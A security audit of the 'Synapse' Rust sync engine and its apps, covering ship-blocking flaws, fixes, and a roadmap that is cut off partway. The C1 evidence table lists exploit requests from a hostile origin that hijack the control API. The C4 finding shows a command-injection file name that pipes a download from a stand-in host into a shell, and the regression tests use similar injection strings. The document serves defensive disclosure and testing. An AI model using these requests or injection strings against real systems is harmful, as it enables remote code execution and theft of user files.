# Synapse — Production-Readiness Audit

| | |
|---|---|
| **Date** | 22 November 2026 |
| **Scope** | `synapse-core` (Rust engine), CI/CD, Gradle builds, Android manifest, Linux packaging, repo layout |
| **Engine version audited** | `synapse-core` 1.0.0 (Cargo), Android app 1.0.6, Desktop 1.0.5 |
| **Verdict** | **Not production-ready.** Four ship-blockers found; C1 and C4 fixed on 22 Nov 2026, C3 partly fixed |

---

## Contents

0. [Fix log — 22 November 2026](#0-fix-log--22-november-2026)
1. [Executive summary](#1-executive-summary)
2. [Scope and method](#2-scope-and-method)
3. [What is already good](#3-what-is-already-good)
4. [Findings summary table](#4-findings-summary-table)
5. [Critical findings (ship-blockers)](#5-critical-findings-ship-blockers)
6. [High-severity findings](#6-high-severity-findings)
7. [Medium / polish findings](#7-medium--polish-findings)
8. [What the app is missing entirely](#8-what-the-app-is-missing-entirely)
9. [Recommended fix order (roadmap)](#9-recommended-fix-order-roadmap)
10. [Production-readiness checklist](#10-production-readiness-checklist)
11. [Appendix A — Raw tool results](#appendix-a--raw-tool-results)
12. [Appendix B — Exploit reproduction](#appendix-b--exploit-reproduction)
13. [Appendix C — Not yet reviewed](#appendix-c--not-yet-reviewed)

---

## 0. Fix log — 22 November 2026

These fixes were applied to `synapse-core`. The suite went from 153 tests to **161, all passing** (147 unit + 14 integration). Clippy shows no new warnings.

### C1 — Control API authentication ✅
- **Token always on.** Every route (REST, `/rest/*` aliases, and the WebSocket event stream) now requires the API token. A missing or wrong token returns `401`, and if no token is configured the API rejects everything.
- **Accepted forms:** `Authorization: Bearer <token>` or `X-API-Key: <token>`. The event stream also accepts `?token=` (browsers can't set headers on WebSocket upgrades); no other route accepts a token in the URL.
- **Token creation.** If no `--token` / `SYNAPSE_TOKEN` is given, the engine generates a random 256-bit hex token on first start and stores it in `<SYNAPSE_HOME>/api.token` (mode `0600`). It's reused across restarts. This also covers the Android `synapse_start` JNI path, which previously had no token at all.
- **No wildcard CORS.** Any request with an `Origin` header that isn't explicitly allowed gets `403`. A browser UI can be allowed with `--allow-origin <origin>` (repeatable).
- **Comparison:** the token check uses a constant-time compare.
- **CLI:** `synapse-core status` now sends the token, read from `--token`, the environment, or the token file.
- **Verified live:** the exploit in Appendix B now returns `403` on every step, the preflight gets no `Access-Control-Allow-Origin` header, and no folder or device is created. A legitimate request with the token returns `200`.

Files: `src/api/mod.rs`, `src/lib.rs`, `src/main.rs`.

### C4 — Shell-command injection ✅
- `execute_external_versioning` no longer uses `sh -c` / `cmd /C`. The template is split into program + arguments first (quotes and escapes supported), and placeholders are then filled in per argument. A path is always exactly one literal argument.
- `STFOLDERPATH` / `STFILEPATH` are still exported. Users who need shell features can write `sh -c '… "$STFILEPATH" …'` explicitly.
- A new test sends file names like `a;touch PWNED`, `$(touch PWNED)` and `` `touch PWNED` `` and asserts nothing runs.

File: `src/engine/versioning.rs`.

### C3 — Chunk integrity (partial) 🟡
- **Hash format:** chunk IDs must be 64-character lowercase hex (`storage::is_valid_chunk_hash`). Anything else is rejected before it touches the file system, which closes the path traversal and the multi-byte slice panic.
- **Content check:** `ChunkResponse` from a peer is dropped unless `BLAKE3(data) == chunk_hash`, which closes block-store poisoning.
- **New tests** cover traversal, bad hashes, and poisoned payloads.
- **Still open:** peer identity (mutual TLS bound to the Ed25519 key), BEP over TLS, chunk serving limited to paired peers, and introducer authentication.

Files: `src/storage/mod.rs`, `src/p2p/mod.rs`.

### Test changes
- `tests/integration_test.rs`: the harness uses a token, and every request sends it. The two raw WebSocket handshakes exercise the `?token=` and `X-API-Key` paths.
- Five security regression tests were added:
  - `test_security_api_requires_token`
  - `test_security_api_fails_closed_without_configured_token`
  - `test_security_drive_by_folder_exfiltration_blocked`
  - `test_security_cors_and_origin_allowlist`
  - `test_security_p2p_rejects_poisoned_or_traversal_chunks`

### Docs updated
`docs/api-endpoints.md` and `synapse-core/README.md` (authentication section, `--allow-origin`, `403` response).

### ⚠️ Found after the fix, while running the packaged desktop app (see `ui-review/SYNAPSE_UI_REVIEW.md` §7)
- **The desktop app already sends a token**, so the fix doesn't break it outright. It starts the engine with `--token` and sends `X-API-Key` / `Authorization: Bearer`.
- **But the token is hardcoded**: `MANAGED_API_KEY = "synapse-managed-api-key-2025"` in `DesktopDaemonManager` and both API clients. Anyone can read it from the jar, so it must become a random per-install token.
- **The native client (`SynapseCoreClientImpl`) reads its token only from saved preferences**, which are empty on a fresh install. With the fixed engine, fresh installs lose conflicts, pairing requests, version and Settings data.
  - Verified: 145 unauthenticated `/api/v1/system/status` calls in 25 s.
  - Fix in `CoreDiModule.kt`: `tokenProvider = { apiKeyProvider.getApiKey() ?: preferencesHelper.getApiKey() }`.

### ⚠️ Required follow-up in the Kotlin app
The engine now **rejects requests without the token**, so the app must send it before you ship a rebuilt engine. The app currently uses the prebuilt binaries in `bin/`, `app/desktopApp/bin/` and `jniLibs/`, so nothing changes until those are rebuilt.

1. **Desktop** (`DesktopDaemonManager.kt`, `JvmApiKeyProvider.kt`): either generate a token and launch the engine with `--token <t>` / `SYNAPSE_TOKEN`, or read `<SYNAPSE_HOME>/api.token` after the engine starts. The default home is `~/.synapse`.
2. **Android** (`SyncthingService.kt` / `SyncthingRunnable.kt`, `AndroidApiKeyProvider.kt`): read `<home_dir>/api.token` from the home directory passed to `synapse_start` or to the process. Wait for the file to exist on first start.
3. **HTTP client** (`HttpClientProvider.kt`): add `Authorization: Bearer <token>` to every request (a Ktor `defaultRequest { header(...) }`), and to the WebSocket connection to `/api/v1/events`.
4. **Web target:** start the engine with `--allow-origin <web UI origin>`, and pass the token as `?token=` on the event-stream URL.

---

## 1. Executive summary

Synapse is a Kotlin/Compose Multiplatform app (Android, Desktop, Web, iOS stub) on top of a custom Rust sync engine, `synapse-core`. The engine uses FastCDC chunking, BLAKE3 hashing, a Merkle revision DAG and 3-way merging. The architecture is ambitious and well designed. The engine compiles cleanly, its unit-test suite passes, and its code quality is above average for a project at this stage.

It is not yet shippable, for four reasons:

1. **Anyone can control the engine.** The local control API never checks the auth token and allows requests from any web origin. Any website the user visits, or any app on an Android phone, can add a sync folder, add an attacker's device as trusted, and share the folder with it. **This was confirmed live.**
2. **Devices can't sync with each other.** The engine never opens an outbound connection to a peer. The index and file-notice messages are dropped, and about 4,700 lines of tested networking code (swarm scheduler, NAT traversal, relay, throttling) are never called at runtime.
3. **Peers aren't authenticated.** Peer identity is self-asserted. The Syncthing-compatible (BEP) port runs without TLS and matches peers by device *name*, and data chunks are served to anyone who asks.
4. **A remote code execution bug is waiting.** A shell command can be set through the open API, and synced file names are spliced into it unescaped. It becomes exploitable as soon as #2 is fixed.

Around these there are release-engineering gaps. Android releases are signed with a debug key, no tests run in CI, and every Gradle test task is disabled. A vulnerable SQLite is bundled, and release builds ship stale prebuilt binaries.

---

## 2. Scope and method

### Reviewed in full
- `synapse-core/` — all Rust sources (~17,400 lines across 21 files) and the integration tests
- `.github/workflows/` (`codeql.yml`, `release.yml`) and `synapse-core/.github/workflows/build-binaries.yml`
- Root, `core`, `server`, and `app/*` Gradle build files, plus `gradle/libs.versions.toml`
- `app/androidApp/src/main/AndroidManifest.xml`, `proguard-rules.pro`
- `packaging/` (Arch, CachyOS launcher, Linux setup)
- `README.md`, `SYNAPSE_CORE_SPEC.md`, `docs/api-endpoints.md`

### Executed
| Tool | Purpose |
|---|---|
| `cargo build` | Compile check |
| `cargo test` | Unit and integration tests |
| `cargo clippy --all-targets` | Lint |
| `cargo fmt --check` | Formatting |
| `cargo audit` (against the project's own `Cargo.lock`) | Known-vulnerability scan |
| Live daemon + `curl` | Authentication / CORS exploit check |

### Not reviewed
The Kotlin/Compose source files (`app/shared`, `app/androidApp`, `app/desktopApp`, `core`). They are nested too deep in the folder tree to copy from the connected folder, and the shell on the machine couldn't start because of low disk space. The app is judged on its file structure, file sizes, and build config only. See [Appendix C](#appendix-c--not-yet-reviewed).

---

## 3. What is already good

- **Architecture.** FastCDC content-defined chunking with BLAKE3, a per-file Merkle revision DAG with LCA search, diff3 three-way merge, and quarantine that keeps conflict files out of the synced folder. The design is sound and the spec (`SYNAPSE_CORE_SPEC.md`) is well written.
- **Engine builds cleanly.** No compile errors and no compiler warnings.
- **Good unit-test coverage of the engine.** 153 tests pass (144 unit + 9 integration), including stress tests for relay replay protection, throttling under concurrency, and swarm scheduling.
- **Low lint debt.** Only 16 Clippy warnings, all minor.
- **Safe file handling in the sync path.** Writes are atomic and keep timestamps and permissions. `sanitize_relative_path` strips `..` from relative paths.
- **SQLite configured sensibly.** WAL mode, `synchronous=NORMAL`, foreign keys on.
- **Release pipeline exists.** It produces Windows installers, a Linux tar/JAR, Arch/CachyOS packages, and an Android APK. CodeQL is set up for Kotlin.
- **Platform integration.** Android widgets and shortcuts, Hyprland/Waybar integration, and a desktop tray.

---

## 4. Findings summary table

| ID | Severity | Area | Finding | Status |
|---|---|---|---|---|
| C1 | 🔴 Critical | Engine API | No authentication + wildcard CORS on control API | ✅ **Fixed** (see §0) |
| C2 | 🔴 Critical | Engine P2P | No outbound peer connections; sync messages unhandled | Confirmed in code |
| C3 | 🔴 Critical | Engine P2P | Peer identity not authenticated; BEP plaintext; chunks served to anyone; chunk path traversal | 🟡 **Partly fixed**: chunk traversal + poisoning fixed; peer auth still open |
| C4 | 🔴 Critical (latent) | Engine | Shell-command injection via `versioning_command` + file names | ✅ **Fixed** (see §0) |
| H1 | 🟠 High | Android release | Release APK signed with debug key | Confirmed in build file |
| H2 | 🟠 High | QA / CI | All Gradle test tasks disabled; no Kotlin tests; CI runs no tests | Confirmed |
| H3 | 🟠 High | Engine | Shutdown/restart/stop are no-ops; no SIGTERM handling | Confirmed in code |
| H4 | 🟠 High | Engine | New folders not watched until restart; pause doesn't stop watcher | Confirmed in code |
| H5 | 🟠 High | Dependencies | Vulnerable bundled SQLite (RUSTSEC-2026-0459) | `cargo audit` |
| H6 | 🟠 High | Android | Manifest: global cleartext, `allowBackup`, broad permissions, exported widget receiver | Confirmed |
| H7 | 🟠 High | Release | Releases ship committed (stale) prebuilt binaries instead of building | Confirmed |
| M1 | 🟡 Medium | Product | App still calls itself a Syncthing client throughout | Confirmed |
| M2 | 🟡 Medium | Release | Four different version numbers | Confirmed |
| M3 | 🟡 Medium | Codebase | Dead/stub modules (Ktor server, iOS, web) | Confirmed |
| M4 | 🟡 Medium | Kotlin structure | Very large files; duplicated mobile/desktop dialogs; mock client in production source set | From file listing |
| M5 | 🟡 Medium | Rust hygiene | Never formatted; many `unwrap()`; single DB mutex; test-only features in prod | Confirmed |
| M6 | 🟡 Medium | Repo hygiene | Crash dumps, error logs, large zips and packages in tree; 2.2 MB icon | Confirmed |

---

## 5. Critical findings (ship-blockers)

### C1 — Control API has no authentication and allows any website to call it

**Where**
- `synapse-core/src/api/mod.rs:258–261` — `CorsLayer::new().allow_origin(Any).allow_methods(Any).allow_headers(Any)`
- `synapse-core/src/api/mod.rs:49, 240, 248` — `auth_token` is stored in `AppState`…
- …but **no handler or middleware ever reads it**. A repo-wide `grep auth_token` shows it's only passed around, never compared.
- `synapse-core/src/lib.rs` — the Android JNI entry `synapse_start` never sets a token at all.
- `api/mod.rs:875` `add_device` deserializes a full `DeviceRecord` from the request body, including `is_trusted` and `introducer`.

**Evidence.** The daemon was started with `--token SECRET123`. Every request below was sent **without** the token and with `Origin: https://evil.example`:

| Request | Result |
|---|---|
| `POST /api/v1/folders` — register `/tmp/victim_home_docs` | **201 Created** |
| `POST /api/v1/devices` — attacker device, `is_trusted:true, introducer:true` | **201 Created** |
| `POST /api/v1/folders/loot/devices/<attacker>` — share folder | **200 OK** |
| `POST /api/v1/system/shutdown` | **200 OK** |
| CORS preflight from `evil.example` | `access-control-allow-origin: *` |

Full steps are in [Appendix B](#appendix-b--exploit-reproduction).

**Impact**
- **Desktop:** any web page the user opens can silently reconfigure the engine and share any directory (home folder, SSH keys, documents) with an attacker's device.
- **Android:** any installed app with the ordinary `INTERNET` permission can do the same over `127.0.0.1:9090`. Synapse holds `MANAGE_EXTERNAL_STORAGE`, so that app gets all-files access through Synapse.
- The attacker device is created as a **trusted introducer**, so it can push further devices into the cluster.
- The device ID `AAAAAAA-…` was accepted; there's no Luhn/format validation.

**Fix**
1. Generate a random 32-byte token on first run, store it with `0600` permissions in the Synapse home directory, and have the UI read it from there. On Android, pass it through JNI.
2. Enforce it on **every** route, including the WebSocket upgrade, with middleware and a constant-time compare.
3. Remove the wildcard CORS. Allow only explicit origins, or none if the web target is dropped.
4. Never accept `is_trusted` / `introducer` from the request body unless the request is authenticated. Validate device IDs (Luhn check).
5. Make the CLI send the token (`main.rs` uses a hand-rolled HTTP client that sends no auth header).

Sketch (axum 0.7):

```rust
use axum::{extract::{Request, State}, http::StatusCode, middleware::Next, response::Response};
use subtle::ConstantTimeEq; // add `subtle = "2"`

async fn require_token(State(st): State<AppState>, req: Request, next: Next) -> Result<Response, StatusCode> {
    let expected = st.auth_token.as_deref().ok_or(StatusCode::UNAUTHORIZED)?;
    let supplied = req.headers().get("x-api-key").and_then(|v| v.to_str().ok())
        .or_else(|| req.headers().get("authorization").and_then(|v| v.to_str().ok())
            .and_then(|v| v.strip_prefix("Bearer ")))
        // WebSocket clients can't set headers in browsers: also accept ?token= for /events only
        .unwrap_or("");
    if supplied.as_bytes().ct_eq(expected.as_bytes()).into() { Ok(next.run(req).await) }
    else { Err(StatusCode::UNAUTHORIZED) }
}

// in create_router:
// .layer(axum::middleware::from_fn_with_state(state.clone(), require_token))
// and replace CorsLayer::allow_origin(Any) with an explicit allowlist (or remove it).
```

---

### C2 — Devices cannot actually sync with each other

**Where**
- No outbound connection code exists in the engine. `grep` finds no `Endpoint::client`, no QUIC `connect`, and no peer `TcpStream::connect` (the only one is the CLI status check in `main.rs`).
- `synapse-core/src/p2p/mod.rs:486` — `_ => Ok(None)` silently drops `IndexRequest`, `IndexResponse`, and `FileNotice`.
- `SwarmScheduler` (`p2p/swarm.rs`, 1,323 lines), NAT traversal (`p2p/nat.rs`, 1,325), relay (`p2p/relay.rs`, 1,305) and throttling (`p2p/throttle.rs`, 752) are only re-exported in `p2p/mod.rs:19–20` and never instantiated by the running engine.

**Impact.** The engine listens, discovers peers on the LAN, indexes local folders, and resolves conflicts that tests inject. It never asks a peer for its index and never pulls a chunk, so two real devices will never exchange files. The core product promise isn't implemented end to end. The unit tests pass because each subsystem is tested in isolation, and there's no two-node end-to-end test.

**Fix**
1. Implement the dial side: on discovery of a paired peer, connect via QUIC, then send `Hello` → `IndexRequest`.
2. Handle `IndexResponse` / `FileNotice` by feeding them to `SyncEngine` and queueing missing chunks in `SwarmScheduler`.
3. Run pulls through `BandwidthLimiter`, and fall back to relay/NAT when a direct dial fails.
4. Add an integration test that starts **two engines in separate temp directories**, pairs them, writes a file on A, and asserts it appears byte-identical on B. Add the same test for a concurrent edit that produces a merge.

---

### C3 — Peers are not authenticated

**Where and what**

| Location | Problem |
|---|---|
| `p2p/mod.rs:491` `create_quic_server` | Generates a **fresh self-signed certificate every run** (`rcgen::generate_simple_self_signed`). It's unrelated to the device's Ed25519 identity, and there's no client authentication. |
| `p2p/mod.rs` `Hello` handler | `device_id` is **self-asserted** and accepted as-is. Device IDs are broadcast in plain text every 5 s on UDP discovery, so any LAN host can learn and impersonate one. |
| `p2p/bep.rs:771` | The BEP listener is plain `TcpListener` with **no TLS**, although the comments say "TCP/TLS". Real Syncthing nodes require TLS, so this is neither secure nor actually interoperable. |
| `p2p/mod.rs:540` | BEP peers are matched to paired devices by **device name** (`d.name == hello.device_name`). Anyone announcing the same name is treated as that device. |
| `p2p/mod.rs:464` `ChunkRequest` | Serves any stored chunk to **any** connected peer, paired or not. |
| `p2p/mod.rs:471` `ChunkResponse` | Stores whatever data arrives **without checking that `blake3(data) == chunk_hash`**, so a peer can poison the block store. |
| `storage/mod.rs:1296` `get_chunk_file_path` | `chunk_hash` from the network goes straight into a file path. A value like `../../../../home/user/x` creates or reads files outside the blocks directory (suffix `.chunk`). `&chunk_hash[0..2]` panics on multi-byte input. |
| `p2p/mod.rs:383` `ClusterDevicesAnnouncement` | Trusts whatever `introducer_id` the message claims, so an unauthenticated sender can inject devices with `auto_trust`. |
| `p2p/mod.rs` QUIC stream handler | Reads up to 16 MB per stream from any unauthenticated connection, which is an easy memory-exhaustion vector. |

C3 rows 1–5 and 8 are confirmed by reading the code. The path traversal (row 7) and the hash check (row 6) are also from the code and were not exploited live.

**Impact.** Once C2 is fixed, any host on the same network, or anywhere once relay/NAT is wired, could impersonate a paired device, read the user's chunks, inject corrupted data, and add itself to the cluster.

**Fix**
1. Derive the TLS certificate from the device's Ed25519 identity key and make it persistent. The device ID becomes the hash of the certificate public key, as in Syncthing.
2. Require **mutual TLS** on both QUIC and BEP. After the handshake, compute the peer's device ID from **its certificate**, never from a message field.
3. Reject every message except `Hello` from peers that aren't paired. Only paired, unpaused peers may request chunks, and only for folders shared with them.
4. Validate that `chunk_hash` is exactly 64 lowercase hex characters before using it anywhere. On `ChunkResponse`, recompute BLAKE3 and reject mismatches. Only accept responses to chunks you actually requested.
5. Only accept `ClusterDevicesAnnouncement` from the authenticated connection of a device marked as introducer.
6. Cap message sizes per type and rate-limit unauthenticated connections.

```rust
fn valid_chunk_hash(h: &str) -> bool {
    h.len() == 64 && h.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}
```

---

### C4 — Shell-command injection (becomes remote code execution once sync works)

**Where**
- `api/mod.rs:628` `register_folder` and `PATCH /rest/config/folders/:id` accept `versioning_type` and `versioning_command` from the (unauthenticated, see C1) API.
- `engine/versioning.rs:553–585` `execute_external_versioning` substitutes `%FOLDER_PATH%`, `%FILE_PATH%`, `%FULL_PATH%` into a string and runs it with `sh -c` (Unix) or `cmd /C` (Windows).
- It is triggered from `engine/mod.rs` (~line 403) when a remote revision fast-forwards a local file.

**Impact.** There are two paths to arbitrary code execution on the user's machine:
- Any website sets `versioning_command` to its own payload via C1.
- Even with a legitimate command, a peer can send a file named `$(curl evil|sh).txt`, and that name is spliced into the shell string.

It's not exploitable today **only** because remote updates never arrive (C2).

**Fix**
1. Fix C1 first.
2. Don't build a shell string. Run the configured program directly with `Command::new(program).args([...])`, and pass paths as arguments **and** the existing `STFOLDERPATH` / `STFILEPATH` environment variables. Never interpolate them into the command.
3. Treat setting an external command as a privileged, UI-only action with an explicit warning.

---

## 6. High-severity findings

### H1 — Release APK signed with the debug key
- `app/androidApp/build.gradle.kts`: `buildTypes.release.signingConfig = signingConfigs.getByName("debug")`.
- CI (`release.yml`, Android job) runs `assembleRelease` on a fresh runner, which creates a **new random debug keystore every run**.
- **Impact:** every release has a different signature, so Android refuses to install a new version over an old one. Users must uninstall and lose their data. Debug-signed APKs can't be published on Google Play.
- **Fix:** create a release keystore, store it base64-encoded in GitHub Secrets, decode it in CI, and configure a `release` signing config that reads passwords from environment variables. Consider Play App Signing.

### H2 — No tests run anywhere
- `app/androidApp/build.gradle.kts` and `app/shared/build.gradle.kts` contain an `afterEvaluate` block that sets `enabled = false` on **every task whose name contains "test"**.
- No `commonTest` / `jvmTest` / `androidUnitTest` source directories exist, even though `commonTest.dependencies { kotlin.test }` is declared and the README lists five test commands.
- `release.yml` and `build-binaries.yml` run no `cargo test`, `clippy`, or `fmt`, and `codeql.yml` only compiles.
- **Fix:** remove the test-disabling block. Add ViewModel tests using the `ktor-client-mock` dependency you already have. Add a `ci.yml` on push/PR that runs `cargo fmt --check`, `cargo clippy -- -D warnings`, `cargo test`, `cargo audit`, and `./gradlew check`, and make releases depend on it.

### H3 — Shutdown, restart, and stop don't work
- `api/mod.rs:426–434` — `system_shutdown` and `system_restart` only log and return `200 OK`.
- `lib.rs:274` — JNI `synapse_stop` only sets `RUNNING = false`. The Tokio runtime, API server, listeners and watchers keep running, so a later `synapse_start` returns "already running" or fails to bind ports.
- `main.rs:333` — only Ctrl-C is handled. `SIGTERM` (systemd, `kill`, Android process stop) kills the process without a clean shutdown, so SQLite WAL checkpoints and in-flight writes are skipped.
- **Fix:** keep a `CancellationToken` / `watch` channel in `SynapseCore`, pass it to every spawned task, and trigger it from the API, JNI, Ctrl-C, and SIGTERM (`tokio::signal::unix::signal(SignalKind::terminate())`). Use `axum::serve(...).with_graceful_shutdown(...)`.

### H4 — Folder watching is incomplete
- `lib.rs:170–177` — watchers are created only for folders present **at startup**, each in a `spawn_blocking` task that calls `std::thread::park()` forever. These are blocking-pool threads that are never released.
- `api/mod.rs:628` `register_folder` runs an initial index but **never starts a watcher**, so changes in newly added folders are missed until the engine restarts.
- `pause_folder` / `delete_folder` only update the database; the watcher keeps running.
- **Fix:** add a `WatcherRegistry` (a `HashMap<folder_id, (RecommendedWatcher, JoinHandle)>`) owned by `SyncEngine`, with `start`, `stop`, and `restart` called from add, pause, resume, and delete.

### H5 — Vulnerable and unmaintained dependencies
`cargo audit` against the project's own `Cargo.lock` (263 crates):

| Crate | Version | Advisory | Action |
|---|---|---|---|
| `libsqlite3-sys` (bundled SQLite, via `rusqlite 0.32`) | 0.30.1 | **RUSTSEC-2026-0459** — SQLite CVE-2026-119375 | Upgrade `rusqlite` to a release that pulls `libsqlite3-sys` ≥ 0.39 |
| `chrono` | 0.4.45 | RUSTSEC-2026-0543 — unmaintained | Plan migration (e.g. `time` or `jiff`) |

Also: `tokio` is built with `features = ["full", "test-util"]`. `test-util` belongs in `[dev-dependencies]`. Kotlin dependencies weren't scanned; add Dependabot or Renovate for Gradle and Cargo.

### H6 — Android manifest issues

| Item | Problem | Fix |
|---|---|---|
| `android:usesCleartextTraffic="true"` | Allows plain HTTP to **any** host app-wide | Use `networkSecurityConfig` that allows cleartext only for `127.0.0.1` / `localhost` |
| `android:allowBackup="true"` | The device identity key and database get included in cloud and ADB backups. A restored copy would clone the device's identity | `allowBackup="false"`, or `dataExtractionRules` excluding the Synapse home directory |
| `MANAGE_EXTERNAL_STORAGE` | Play restricts it to approved use cases and needs a policy declaration. Combined with C1 it hands all-files access to any app | Keep it if needed for sync, but file the Play declaration; consider SAF for user-picked folders |
| `SYSTEM_ALERT_WINDOW`, `POST_PROMOTED_NOTIFICATIONS` | Probably unnecessary, and they raise review flags | Remove unless used |
| `CAMERA` | Used for QR pairing, but the app also uses the Play Services code scanner, which needs no camera permission | Remove `CAMERA` if only the code scanner is used |
| `.widget.SynapseWidgetProvider` `exported="true"` with custom actions `ACTION_WIDGET_TOGGLE_SYNC` / `ACTION_WIDGET_SYNC_NOW` | Any app can broadcast these and toggle sync | Use explicit `PendingIntent`s and keep only `APPWIDGET_UPDATE` in the filter, or check the sender |
| `BootReceiver` `exported="true"` | Accepts any broadcast matching its filter | Check `intent.action == BOOT_COMPLETED` in code |
| Foreground-service description | Says it "runs the local Syncthing daemon process" | Update to describe Synapse Core (Play reviewers read this) |

### H7 — Releases ship committed, stale binaries
- `.gitignore` deliberately un-ignores `/bin/synapse-core` and `/app/desktopApp/bin/synapse-core`. The Android `.so` files sit in `app/androidApp/src/main/jniLibs/`.
- `release.yml` never builds `synapse-core`; it packages whatever binaries are committed.
- The copies already disagree:

| Binary | Size |
|---|---|
| `synapse-core/bin/synapse-core` | 8,592,072 B |
| `bin/` and `packaging/.../usr/bin/synapse-core` | 8,592,072 B |
| `app/desktopApp/bin/synapse-core` | **11,594,960 B** |
| `synapse-core/bin/android/x86_64/libsynapse.so` | 8,461,784 B |
| `app/androidApp/src/main/jniLibs/x86_64/libsynapse.so` | **8,536,240 B** |

- **Impact:** releases may contain an older engine than the source code. Nobody can verify what was shipped (no reproducibility), and the git history grows by megabytes per update.
- **Fix:** build the engine in CI for each target (the `build-binaries.yml` matrix already exists), upload them as artifacts, and have the packaging jobs download them. Stop committing binaries and remove them from history with `git filter-repo` or Git LFS.

---

## 7. Medium / polish findings

### M1 — The app still identifies as a Syncthing client
- `README.md` describes Synapse as a "Cross-platform Compose Multiplatform client for Syncthing", and its architecture section talks about the Syncthing daemon.
- Kotlin types: `SyncthingService`, `SyncthingRunnable`, `SyncthingApiClient`, `MockSyncthingApiClient`.
- The Android foreground-service description mentions the Syncthing daemon.
- `packaging/cachyos/synapse-cachyos` symlinks system `syncthing` as `~/Synapse/bin/syncthing.exe` on Linux.
- The API exposes duplicate `/rest/...` Syncthing-style routes next to `/api/v1/...`.
- **Fix:** decide the product story. If Synapse Core replaces Syncthing, rename the classes, rewrite the README around Synapse Core, drop the Syncthing launcher logic, and deprecate the `/rest` aliases. If it's meant to stay Syncthing-compatible, real BEP needs TLS and real device IDs (see C3).

### M2 — Version numbers disagree

| Place | Version |
|---|---|
| `synapse-core/Cargo.toml` | 1.0.0 |
| `synapse-core/src/main.rs` (`#[command(version = "1.0.0")]`, startup log) | 1.0.0 (hardcoded) |
| `app/desktopApp/build.gradle.kts` `packageVersion` | 1.0.5 |
| `app/androidApp/build.gradle.kts` `versionName` / `versionCode` | 1.0.6 / 6 |

**Fix:** keep one version in `gradle.properties` (or derive it from the git tag in CI), feed it to all modules, and use `env!("CARGO_PKG_VERSION")` / `#[command(version)]` in Rust.

### M3 — Dead or stub modules
- `server/` — a Ktor "Hello, Ktor!" app listening on **0.0.0.0:8080** (all interfaces). It's unused and confusing; delete it or bind it to localhost.
- `app/iosApp` — an empty SwiftUI wrapper. No iOS build exists in CI.
- `app/webApp` — the README itself documents CORS and mixed-content blockers, and it only works because of the insecure wildcard CORS (C1). Either design a proper web story (the engine serving the UI from the same origin) or remove it.
- `core/` contains `MockSyncthingApiClient` in **`commonMain`**, so a mock client ships in production builds. Move it to `commonTest`.

### M4 — Kotlin code structure (from file sizes and names)
- Very large files: `DesktopDashboardScreen.kt` **69 KB**, `App.kt` **51 KB**, `DesktopSettingsScreen.kt` 37 KB, `DesktopFoldersScreen.kt` 31 KB, `FoldersScreen.kt` 27 KB. Split them into composables per card or section with their own previews.
- Mobile and desktop versions of the same dialogs are near-identical in size, which suggests copy-paste:

| Mobile | Desktop |
|---|---|
| `AddDeviceDialog.kt` 15,034 B | `DesktopAddDeviceDialog.kt` 15,050 B |
| `EditDeviceDialog.kt` 18,002 B | `DesktopEditDeviceDialog.kt` 18,923 B |
| `EditFolderDialog.kt` 19,104 B | `DesktopEditFolderDialog.kt` 20,400 B |

  Extract shared form state and content into `commonMain`, and keep only the layout shell per platform.
- The build log shows warnings such as unnecessary safe calls in `FoldersScreen.kt:599` / `DesktopFoldersScreen.kt:600`, which is another sign of duplicated code.

### M5 — Rust code hygiene
- `cargo fmt --check` reports **413 diffs**; the code has never been run through rustfmt. Add a `rustfmt.toml` and enforce it in CI.
- **16 Clippy warnings**, including an `if` with identical branches in `conflict/diff3.rs:148` (worth a look for a logic slip) and a large `Err` type in `p2p/relay.rs:456`.
- **47 `.unwrap()` calls in `storage/mod.rs`**, mostly `self.conn.lock().unwrap()`. One panic while the lock is held poisons the mutex, and then every later database call panics. Use `parking_lot::Mutex`, or map the poison error.
- All database access is serialized through one `Mutex<rusqlite::Connection>`, so the API, watchers and P2P block each other. Use an r2d2/deadpool pool, or a dedicated database thread with a channel.
- The log level is hardcoded to `Level::INFO` in `main.rs:155`. Use `EnvFilter::from_default_env()` so `RUST_LOG` works, and add a file appender with rotation for desktop.
- There's a hand-rolled HTTP/1.1 client in `main.rs` (`reqwest_minimal_get`) that ignores status codes and chunked encoding. Use a small client crate, or skip HTTP for CLI status.
- `static mut RUNTIME` in `lib.rs` is unused and is a `static mut` reference hazard; delete it.

### M6 — Repository hygiene
Remove these from the project root, and from git if they're tracked:
- `hs_err_pid27504.log`, `hs_err_pid3816.log` (JVM crash dumps, 315 KB)
- `err.txt`, `err_android.txt`, `err_check.txt`, `build_errors.txt`. `err_check.txt` is saved in UTF-16.
- `syncthing-main.zip` (5.9 MB) and `syncthing-android-main.zip` (10.3 MB). They're git-ignored, but they still sit in the project folder.
- `packaging/cachyos/*.pkg.tar.zst` (3 × ~50 MB), plus `packaging/cachyos/pkg/` and `src/` build output
- `ArcadeLabs/` (an unrelated directory inside the project)
- `logo.png` is **2.2 MB** and is used as the Android launcher icon and in shared Compose resources. Use adaptive vector icons and a properly sized PNG (under 100 KB).

---

## 8. What the app is missing entirely

| Area | What's missing |
|---|---|
| **Security** | A threat model and a `SECURITY.md` (how to report vulnerabilities); a security section in the docs describing API auth, peer authentication and encryption at rest |
| **Testing** | Kotlin unit tests, UI tests, a two-node end-to-end sync test, and fuzzing of the network message parsers (`cargo fuzz` on BEP/P2P decode) |
| **CI** | A PR pipeline (lint, test, audit), required checks before release, and Dependabot/Renovate |
| **Release** | Release signing (Android), code signing (Windows `.msi`/`.exe`), notarization (macOS `.dmg`), checksums and signatures on release assets, a changelog, and an auto-update mechanism |
| **Observability** | Configurable logging, log files with rotation, a "copy diagnostics" button, and opt-in crash reporting |
| **Data safety** | Database schema versioning (`PRAGMA user_version`) and migration tests; backup/restore of configuration; a documented recovery path if the database is corrupt |
| **Store compliance** | A privacy policy (required on Play given all-files access and camera), the Play `MANAGE_EXTERNAL_STORAGE` declaration, and a data-safety form |
| **UX quality** | Localization (`strings.xml` is ~450 bytes, so most UI text is likely hardcoded in Kotlin), an accessibility pass (content descriptions, contrast, keyboard navigation on desktop), and first-run onboarding |
| **Docs** | Contributor guide, architecture docs matching the *current* engine, and API docs generated from code (e.g. OpenAPI via `utoipa`) |

---

## 9. Recommended fix order (roadmap)

| Phase | Work | Why first |
|---|---|---|
| **1 — Lock the door** | C1 (API token on all routes, remove wildcard CORS, validate device IDs), C4 (no shell strings), H6 manifest fixes | Currently exploitable by any website or app |
| **2 — Trust the peers** | C3: identity-bound certificates, mutual TLS on QUIC and BEP, chunk-hash validation, introducer auth, message size caps | Must exist *before* sync is enabled, or C2 turns into data theft |
